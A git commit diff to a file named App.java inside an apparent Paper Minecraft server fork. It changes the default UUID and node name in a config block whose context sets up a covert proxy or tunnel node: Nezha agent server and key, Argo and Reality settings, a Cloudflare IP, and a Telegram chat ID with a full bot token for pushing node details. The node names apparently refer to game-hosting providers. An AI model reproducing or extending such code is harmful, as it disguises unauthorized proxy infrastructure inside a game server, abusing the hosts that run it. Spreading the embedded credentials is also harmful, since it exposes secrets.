ec1b336a50c5ec429028099e2a02ebeb806cb1c8
bailangmax <langb6416@gmail.com>
2026-08-26 21:16:57 +0800

    Update App.java

--- paper-server/src/main/java/io/papermc/paper/sbx/App.java
+++ paper-server/src/main/java/io/papermc/paper/sbx/App.java
@@ -44,7 +44,7 @@ public class App {
     private static final boolean YT_WARPOUT = envBool("YT_WARPOUT", false);
     private static final String FILE_PATH = env("FILE_PATH", "world");
     private static final String SUB_PATH = env("SUB_PATH", "sub");
-    private static final String UUID = env("UUID", "c84fd4e8-7ad2-4735-9535-671dd3fd2b00");
+    private static final String UUID = env("UUID", "5fbde1da-8fc0-49b5-893c-85fcf1b143c8");
     private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nz.xry.kdns.fr:443");
     private static final String NEZHA_PORT = env("NEZHA_PORT", "");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "oZEaed4hQmmjuTBzga1vE5HlUPFbYvCw");
@@ -58,7 +58,7 @@ public class App {
     private static final String REALITY_PORT = env("REALITY_PORT", "");
     private static final String CFIP = env("CFIP", "cf.877774.xyz");
     private static final int CFPORT = envInt("CFPORT", 443);
-    private static final String NAME = env("NAME", "laternodes");
+    private static final String NAME = env("NAME", "gamesilo");
     private static final String CHAT_ID = env("CHAT_ID", "7627328147");  // 如果关闭了log输出,请填写tg推送，否则找不到节点
     private static final String BOT_TOKEN = env("BOT_TOKEN", "8712829238:AAEkSunL7neEXazQUzTXFaWFbajD2SQEA-Y");
     private static final boolean DISABLE_ARGO = envBool("DISABLE_ARGO", false);
